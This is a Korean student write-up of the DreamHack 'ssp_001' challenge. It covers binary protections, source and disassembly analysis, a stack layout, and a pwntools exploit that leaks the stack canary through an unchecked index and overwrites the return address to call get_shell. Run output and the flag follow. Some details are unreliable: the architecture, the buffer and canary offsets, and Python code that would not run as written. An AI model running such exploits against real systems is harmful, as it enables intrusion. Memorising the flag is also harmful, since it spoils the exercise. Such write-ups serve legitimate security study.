시스템 해킹 기초
DreamHack_SPP_001

 11반_허은정(9206)

보호 기법

eunjung@eunjung-virtual-machine:~/dreamhack/ssp_001$ checksec ssp_001
[*] '/home/eunjung/dreamhack/ssp_001'
	Arch:	1386-32-little
	RELRO:	Partial RELRO
	Stack:	Canary found
	NX:	NX enabled
	PIE:	No PIE (0x8048000)

=> 
1) Arch
이 바이너리 파일의 아키텍처는 1386(32비트) 리틀 엔디언입니다.

2) RELRO (Relocation Read-Only)
RELRO는 Relocation Read-Only의 줄임말로, 바이너리의 Relocation 테이블 일부를 읽기 전용으로 만듭니다. Partial RELRO는 일부 섹션만 읽기 전용으로 만든다는 것을 의미합니다.

3) Stack 
스택에 Canary(카나리아) 값을 사용하여 버퍼 오버플로우와 같은 공격을 탐지하는 것으로 추정됩니다. 이는 스택 보호 메커니즘이 활성화되어 있는 것을 나타냅니다.

4) NX (No eXecute)
NX 비트가 활성화되어 있음을 의미합니다. 이는 데이터 섹션에 실행 가능한 코드가 존재하지 않도록 하는 것으로, 코드 인젝션 공격을 방어하는 데 도움이 됩니다.

5) PIE (Position Independent Executable)
PIE는 Position Independent Executable의 줄임말로, 메모리 주소 무작위화를 통해 공격자가 고정된 주소를 예측하는 것을 어렵게 합니다. No PIE는 이러한 무작위화가 비활성화되었음을 의미하며, 프로그램이 메모리의 고정된 위치에 로드된다는 것을 나타냅니다. 주어진 주소(0x8048000)는 프로그램이 로드되는 베이스 주소를 나타냅니다.




소스코드 분석

1 #include <stdio.h>
2 #include <stdlib.h>
3 #include <signal.h>
4 #include <unistd.h>
5
6 void alarm_handler() {
7     puts("TIME OUT");
8     exit(-1);
9 }
10 void initialize() {
11     setvbuf(stdin, NULL, _IONBF, 0);
12     setvbuf(stdout, NULL, _IONBF, 0);
13     signal(SIGALRM, alarm_handler);
14     alarm(30);
15 }
16 void get_shell() {
17     system("/bin/sh");
18 }
19 void print_box(unsigned char *box, int idx) {
20     printf("Element of index %d is : %02x\n", idx, box[idx]);
21 }
22 void menu() {
23     puts("[F]ill the box");
24     puts("[P]rint the box");
25     puts("[E]xit");
26     printf("> ");
27 }
28 int main(int argc, char *argv[]) {
29     unsigned char box[0x40] = {};
30     char name[0x40] = {};
31     char select[2] = {};
32     int idx = 0, name_len = 0;
33     initialize();
34     while(1) {
35         menu();
36         read(0, select, 2);
37         switch( select[0] ) {
38             case 'F':
39                 printf("box input : ");
40                 read(0, box, sizeof(box));
41                 break;
42             case 'P':
43                 printf("Element index : ");
44                 scanf("%d", &idx);
45                 print_box(box, idx);
46                 break;
47             case 'E':
48                 printf("Name Size : ");
49                 scanf("%d", &name_len);
50                 printf("Name : ");
51                 read(0, name, name_len);
52                 return 0;
53             default:
54                 break;
55         }
56     }
57 }

=> 
1) 1 ~ 4행
필요한 헤더파일을 포함합니다.

2) 6 ~ 8행
SIGALRM 시그널에 대한 핸들러로 설정됩니다. SIGALRM 시그널이 발생하면 "TIME OUT" 메시지를 출력하고 프로그램을 종료합니다.

3) 10 ~ 14행
프로그램을 초기화합니다. 표준 입력(stdin)과 표준 출력(stdout)의 버퍼링을 비활성화하고, SIGALRM 시그널에 대한 핸들러를 등록합니다. 그리고 30초 후에 SIGALRM 시그널을 발생시키도록 설정합니다.

4) 16 ~ 17행
/bin/sh 셸을 실행합니다. 하지만 현재 코드에서는 호출되지 않습니다.

5) 19 ~ 20행
상자(box)의 요소를 인덱스에 따라 출력합니다.

6) 22 ~ 26행
사용자에게 상자를 채우거나 출력할 수 있는 메뉴를 출력합니다.

7) 28 ~ 56행
프로그램의 진입점입니다. 상자(box)와 사용자 이름(name)을 선언하고 초기화한 후, 사용자의 입력을 받고 처리합니다. 사용자가 'F'를 입력하면 상자에 입력을 받습니다. ‘P’를 입혁하면 print_box 함수를 호출하여 해당 인덱스 값을 출력합니다. ‘E’를 입력하면 name_len 변수에 이름의 크기를 입력받고 name 변수에 해당하는 크기만큼 이름을 입력 받습니다.

=> 
메뉴 E에서 원하는 크기만큼 box에 입력을 줄 수 있기 때문에 버퍼 오버플로우가 발생합니다.
메뉴 P에서 인덱스를 입력받을 때 경계값 검사를 하지 않기 때문에, 64 이상의 인덱스를 입력하여 name 아래에 있는 값을 출력할 수 있습니다.


gdb

(gdb) disas main
Dump of assembler code for function main:
   0x0804872b <+0>:     push   ebp
   0x0804872c <+1>:     mov    ebp,esp
   0x0804872e <+3>:     push   edi
   0x0804872f <+4>:     sub    esp,0x94
   0x08048735 <+10>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048738 <+13>:    mov    DWORD PTR [ebp-0x98],eax
   0x0804873e <+19>:    mov    eax,gs:0x14
   0x08048744 <+25>:    mov    DWORD PTR [ebp-0x8],eax
   0x08048747 <+28>:    xor    eax,eax
   0x08048749 <+30>:    lea    edx,[ebp-0x88]
   0x0804874f <+36>:    mov    eax,0x0
   0x08048754 <+41>:    mov    ecx,0x10
   0x08048759 <+46>:    mov    edi,edx
   0x0804875b <+48>:    rep stos DWORD PTR es:[edi],eax
   0x0804875d <+50>:    lea    edx,[ebp-0x48]
   0x08048760 <+53>:    mov    eax,0x0
   0x08048765 <+58>:    mov    ecx,0x10
   0x0804876a <+63>:    mov    edi,edx
   0x0804876c <+65>:    rep stos DWORD PTR es:[edi],eax
   0x0804876e <+67>:    mov    WORD PTR [ebp-0x8a],0x0
   0x08048777 <+76>:    mov    DWORD PTR [ebp-0x94],0x0
   0x08048781 <+86>:    mov    DWORD PTR [ebp-0x90],0x0
   0x0804878b <+96>:    call   0x8048672 <initialize>
   0x08048790 <+101>:   call   0x80486f1 <menu>
   0x08048795 <+106>:   push   0x2
   0x08048797 <+108>:   lea    eax,[ebp-0x8a]
   0x0804879d <+114>:   push   eax
   0x0804879e <+115>:   push   0x0
   0x080487a0 <+117>:   call   0x80484a0 <read@plt>
   0x080487a5 <+122>:   add    esp,0xc
   0x080487a8 <+125>:   movzx  eax,BYTE PTR [ebp-0x8a]
   0x080487af <+132>:   movsx  eax,al
   0x080487b2 <+135>:   cmp    eax,0x46
   0x080487b5 <+138>:   je     0x80487c6 <main+155>
   0x080487b7 <+140>:   cmp    eax,0x50
   0x080487ba <+143>:   je     0x80487eb <main+192>
   0x080487bc <+145>:   cmp    eax,0x45
   0x080487bf <+148>:   je     0x8048824 <main+249>
   0x080487c1 <+150>:   jmp    0x804887a <main+335>
   0x080487c6 <+155>:   push   0x804896c
   0x080487cb <+160>:   call   0x80484b0 <printf@plt>
   0x080487d0 <+165>:   add    esp,0x4
   0x080487d3 <+168>:   push   0x40
   0x080487d5 <+170>:   lea    eax,[ebp-0x88] 
   0x080487db <+176>:   push   eax
   0x080487dc <+177>:   push   0x0
   0x080487de <+179>:   call   0x80484a0 <read@plt>
   0x080487e3 <+184>:   add    esp,0xc
   0x080487e6 <+187>:   jmp    0x804887a <main+335>
   0x080487eb <+192>:   push   0x8048979
   0x080487f0 <+197>:   call   0x80484b0 <printf@plt>
   0x080487f5 <+202>:   add    esp,0x4
   0x080487f8 <+205>:   lea    eax,[ebp-0x94]
   0x080487fe <+211>:   push   eax
   0x080487ff <+212>:   push   0x804898a
   0x08048804 <+217>:   call   0x8048540 <__isoc99_scanf@plt>
   0x08048809 <+222>:   add    esp,0x8
   0x0804880c <+225>:   mov    eax,DWORD PTR [ebp-0x94]
   0x08048812 <+231>:   push   eax
   0x08048813 <+232>:   lea    eax,[ebp-0x88]
   0x08048819 <+238>:   push   eax
   0x0804881a <+239>:   call   0x80486cc <print_box>
   0x0804881f <+244>:   add    esp,0x8
   0x08048822 <+247>:   jmp    0x804887a <main+335>
   0x08048824 <+249>:   push   0x804898d
   0x08048829 <+254>:   call   0x80484b0 <printf@plt>
   0x0804882e <+259>:   add    esp,0x4
   0x08048831 <+262>:   lea    eax,[ebp-0x90] <<--- case E의 name_len
   0x08048837 <+268>:   push   eax
   0x08048838 <+269>:   push   0x804898a
   0x0804883d <+274>:   call   0x8048540 <__isoc99_scanf@plt>
   0x08048842 <+279>:   add    esp,0x8
   0x08048845 <+282>:   push   0x804899a
   0x0804884a <+287>:   call   0x80484b0 <printf@plt>
   0x0804884f <+292>:   add    esp,0x4
   0x08048852 <+295>:   mov    eax,DWORD PTR [ebp-0x90]
   0x08048858 <+301>:   push   eax
   0x08048859 <+302>:   lea    eax,[ebp-0x48]
   0x0804885c <+305>:   push   eax
   0x0804885d <+306>:   push   0x0
   0x0804885f <+308>:   call   0x80484a0 <read@plt>
   0x08048864 <+313>:   add    esp,0xc
   0x08048867 <+316>:   mov    eax,0x0
   0x0804886c <+321>:   mov    edx,DWORD PTR [ebp-0x8]
   0x0804886f <+324>:   xor    edx,DWORD PTR gs:0x14
   0x08048876 <+331>:   je     0x8048884 <main+345>
   0x08048878 <+333>:   jmp    0x804887f <main+340>
   0x0804887a <+335>:   jmp    0x8048790 <main+101>
   0x0804887f <+340>:   call   0x80484e0 <__stack_chk_fail@plt>
   0x08048884 <+345>:   mov    edi,DWORD PTR [ebp-0x4]
   0x08048887 <+348>:   leave
   0x08048888 <+349>:   ret
End of assembler dump.

=> 

1) case F: box의 위치를 알 수 있습니다.

   0x080487c6 <+155>:   push   0x804896c
   0x080487cb <+160>:   call   0x80484b0 <printf@plt>
   0x080487d0 <+165>:   add    esp,0x4
   0x080487d3 <+168>:   push   0x40
   0x080487d5 <+170>:   lea    eax,[ebp-0x88]
   0x080487db <+176>:   push   eax
   0x080487dc <+177>:   push   0x0
   0x080487de <+179>:   call   0x80484a0 <read@plt>
   0x080487e3 <+184>:   add    esp,0xc
   0x080487e6 <+187>:   jmp    0x804887a <main+335>

2) case P: idx의 위치를 알 수 있습니다.

   0x080487eb <+192>:   push   0x8048979
   0x080487f0 <+197>:   call   0x80484b0 <printf@plt>
   0x080487f5 <+202>:   add    esp,0x4
   0x080487f8 <+205>:   lea    eax,[ebp-0x94]
   0x080487fe <+211>:   push   eax
   0x080487ff <+212>:   push   0x804898a
   0x08048804 <+217>:   call   0x8048540 <__isoc99_scanf@plt>
   0x08048809 <+222>:   add    esp,0x8
   0x0804880c <+225>:   mov    eax,DWORD PTR [ebp-0x94]
   0x08048812 <+231>:   push   eax
   0x08048813 <+232>:   lea    eax,[ebp-0x88]
   0x08048819 <+238>:   push   eax
   0x0804881a <+239>:   call   0x80486cc <print_box>
   0x0804881f <+244>:   add    esp,0x8
   0x08048822 <+247>:   jmp    0x804887a <main+335>

3) case E: name, name_len의 위치를 알 수 있습니다.

   0x08048824 <+249>:   push   0x804898d
   0x08048829 <+254>:   call   0x80484b0 <printf@plt>
   0x0804882e <+259>:   add    esp,0x4
   0x08048831 <+262>:   lea    eax,[ebp-0x90]
   0x08048837 <+268>:   push   eax
   0x08048838 <+269>:   push   0x804898a
   0x0804883d <+274>:   call   0x8048540 <__isoc99_scanf@plt>
   0x08048842 <+279>:   add    esp,0x8
   0x08048845 <+282>:   push   0x804899a
   0x0804884a <+287>:   call   0x80484b0 <printf@plt>
   0x0804884f <+292>:   add    esp,0x4
   0x08048852 <+295>:   mov    eax,DWORD PTR [ebp-0x90]
   0x08048858 <+301>:   push   eax
   0x08048859 <+302>:   lea    eax,[ebp-0x48]
   0x0804885c <+305>:   push   eax
   0x0804885d <+306>:   push   0x0
   0x0804885f <+308>:   call   0x80484a0 <read@plt>
   0x08048864 <+313>:   add    esp,0xc

4) select: ebp-0x8a에 위치하는 것을 알 수 있습니다.

   0x08048797 <+108>:   lea    eax,[ebp-0x8a]
   0x0804879d <+114>:   push   eax
   0x0804879e <+115>:   push   0x0
   0x080487a0 <+117>:   call   0x80484a0 <read@plt>

5) dummy 확인: ebp-0x8a에 카나리가 위치하는 것을 알 수 있고 ebp와 canary 사이에 4byte 더미값이 존재하는 것을 알 수 있습니다.

   0x0804873e <+19>:    mov    eax,gs:0x14
   0x08048744 <+25>:    mov    DWORD PTR [ebp-0x8],eax
   0x08048747 <+28>:    xor    eax,eax
   0x08048749 <+30>:    lea    edx,[ebp-0x88]
   0x0804874f <+36>:    mov    eax,0x0
   0x08048754 <+41>:    mov    ecx,0x10
   0x08048759 <+46>:    mov    edi,edx
   0x0804875b <+48>:    rep stos DWORD PTR es:[edi],eax
   0x0804875d <+50>:    lea    edx,[ebp-0x48]
   0x08048760 <+53>:    mov    eax,0x0
   0x08048765 <+58>:    mov    ecx,0x10
   0x0804876a <+63>:    mov    edi,edx
   0x0804876c <+65>:    rep stos DWORD PTR es:[edi],eax
   0x0804876e <+67>:    mov    WORD PTR [ebp-0x8a],0x0
   0x08048777 <+76>:    mov    DWORD PTR [ebp-0x94],0x0
   0x08048781 <+86>:    mov    DWORD PTR [ebp-0x90],0x0
   0x0804878b <+96>:    call   0x8048672 <initialize>
   0x08048790 <+101>:   call   0x80486f1 <menu>
   0x08048795 <+106>:   push   0x2
   0x08048797 <+108>:   lea    eax,[ebp-0x8a]
   0x0804879d <+114>:   push   eax
   0x0804879e <+115>:   push   0x0
   0x080487a0 <+117>:   call   0x80484a0 <read@plt>
   0x080487a5 <+122>:   add    esp,0xc
   0x080487a8 <+125>:   movzx  eax,BYTE PTR [ebp-0x8a]
   0x080487af <+132>:   movsx  eax,al
   0x080487b2 <+135>:   cmp    eax,0x46
   0x080487b5 <+138>:   je     0x80487c6 <main+155>
   0x080487b7 <+140>:   cmp    eax,0x50
   0x080487ba <+143>:   je     0x80487eb <main+192>
   0x080487bc <+145>:   cmp    eax,0x45
   0x080487bf <+148>:   je     0x8048824 <main+249>
   0x080487c1 <+150>:   jmp    0x804887a <main+335>
   0x080487c6 <+155>:   push   0x804896c
   0x080487cb <+160>:   call   0x80484b0 <printf@plt>
   0x080487d0 <+165>:   add    esp,0x4
   0x080487d3 <+168>:   push   0x40
   0x080487d5 <+170>:   lea    eax,[ebp-0x88] 
   0x080487db <+176>:   push   eax
   0x080487dc <+177>:   push   0x0
   0x080487de <+179>:   call   0x80484a0 <read@plt>
   0x080487e3 <+184>:   add    esp,0xc
   0x080487e6 <+187>:   jmp    0x804887a <main+335>
   0x080487eb <+192>:   push   0x8048979
   0x080487f0 <+197>:   call   0x80484b0 <printf@plt>
   0x080487f5 <+202>:   add    esp,0x4
   0x080487f8 <+205>:   lea    eax,[ebp-0x94]
   0x080487fe <+211>:   push   eax
   0x080487ff <+212>:   push   0x804898a
   0x08048804 <+217>:   call   0x8048540 <__isoc99_scanf@plt>
   0x08048809 <+222>:   add    esp,0x8
   0x0804880c <+225>:   mov    eax,DWORD PTR [ebp-0x94]
   0x08048812 <+231>:   push   eax
   0x08048813 <+232>:   lea    eax,[ebp-0x88]
   0x08048819 <+238>:   push   eax
   0x0804881a <+239>:   call   0x80486cc <print_box>
   0x0804881f <+244>:   add    esp,0x8
   0x08048822 <+247>:   jmp    0x804887a <main+335>
   0x08048824 <+249>:   push   0x804898d
   0x08048829 <+254>:   call   0x80484b0 <printf@plt>
   0x0804882e <+259>:   add    esp,0x4
   0x08048831 <+262>:   lea    eax,[ebp-0x90] <<--- case E의 name_len
   0x08048837 <+268>:   push   eax
   0x08048838 <+269>:   push   0x804898a
   0x0804883d <+274>:   call   0x8048540 <__isoc99_scanf@plt>
   0x08048842 <+279>:   add    esp,0x8
   0x08048845 <+282>:   push   0x804899a
   0x0804884a <+287>:   call   0x80484b0 <printf@plt>
   0x0804884f <+292>:   add    esp,0x4
   0x08048852 <+295>:   mov    eax,DWORD PTR [ebp-0x90]
   0x08048858 <+301>:   push   eax
   0x08048859 <+302>:   lea    eax,[ebp-0x48]
   0x0804885c <+305>:   push   eax
   0x0804885d <+306>:   push   0x0
   0x0804885f <+308>:   call   0x80484a0 <read@plt>
   0x08048864 <+313>:   add    esp,0xc
   0x08048867 <+316>:   mov    eax,0x0
   0x0804886c <+321>:   mov    edx,DWORD PTR [ebp-0x8]
   0x0804886f <+324>:   xor    edx,DWORD PTR gs:0x14
   0x08048876 <+331>:   je     0x8048884 <main+345>
   0x08048878 <+333>:   jmp    0x804887f <main+340>
   0x0804887a <+335>:   jmp    0x8048790 <main+101>
   0x0804887f <+340>:   call   0x80484e0 <__stack_chk_fail@plt>




스택구조


idx (0x4) 
name_len (0x4)
select (0x2)
box (0x40)
name (0x40) 
canary (0x4)
dummy (0x4)
ebp (0x4)
ret (0x4)
154




익스플로잇 코드

from pwn import *


p = remote("host3.dreamhack.games", 18164) # 원격 호스트에 연결합니다.


e = ELF('./ssp_001') # ELF 파일을 로드합니다.


context.log_level = "debug" # 로그 레벨을 디버그로 설정합니다.


get_shell = e.symbols['get_shell'] # 'get_shell' 함수의 주소를 가져옵니다.


canary="" # Canary 값을 저장할 변수를 초기화합니다.

# 128부터 131까지의 Element index에 대해 Canary 값을 추출합니다.
for i in range(128,132):
    p.sendlineafter(">", "P")
    p.sendlineafter("Element index :",str(i))
    p.recvuntil("is : ")
    canary = p.recv(2)+canary

print(‘canary :0x%08x’ %canary)

p.sendlineafter(">", "E") # 'E'를 전송하여 End 요청을 수행합니다.
p.sendlineafter('Size : ', '500') # Size를 전송합니다.


payload = "" # 공격 페이로드를 구성합니다.
payload += "A"*64 # 64바이트의 'A'를 추가합니다.
payload += p32(int(canary,16)) # 추출한 Canary 값을 little-endian 형태로 추가합니다.
payload += "\x00"*8 # 쉘을 획득하기 위한 패딩을 추가합니다.
payload += p32(get_shell) # 'get_shell' 함수의 주소를 추가합니다.

p.send(payload) # 공격 페이로드를 서버에 전송합니다.

p.interactive() # 프로그램과 상호작용하기 위해 대화형 모드로 전환합니다.
익스플로잇

eunjung@eunjung-virtual-machine : ~/dreamhack/ssp_001 : python3 ssp.py

[+] Opening connection to host3.dreamhack.games on port 18164: Done
[*] '/home/eunjung/dreamhack/ssp_001'
   Arch:	i386-32-little
   RELRO:	Partial RELRO
   Stack:	Canary found
   NX:		NX enabled
   PIE:		No PIE (0x8048000)
[+] canary: 0x1a1db100
[*] Switching to interactive mode

$ cat flag
DH{00c609773822372daf2b7ef9adbdb824}


Flag 값

DH{00c609773822372daf2b7ef9adbdb824}
